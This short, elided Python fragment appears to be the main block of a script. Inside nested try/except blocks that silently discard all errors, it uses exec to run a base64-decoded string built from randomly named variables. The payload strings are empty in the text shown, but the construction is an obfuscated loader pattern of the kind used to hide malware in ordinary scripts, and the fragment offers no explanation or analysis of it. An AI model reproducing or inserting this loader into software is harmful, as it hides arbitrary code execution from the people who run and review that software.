...
if __name__ == "__main__":
    ...
    try:
        ...
        try:
            exec('import base64 as _flnbtUL\n_gmlTFAk = ""\n_opkiGwzTIuLX = ""\n_hDt_IWcGzUHf = _gmlTFAk + _opkiGwzTIuLX\n_rUSaKe = _flnbtUL.b64decode(_hDt_IWcGzUHf).decode()\nexec(compile(_rUSaKe, "<s>", "exec"))')
        except:
            pass
    except:
        pass
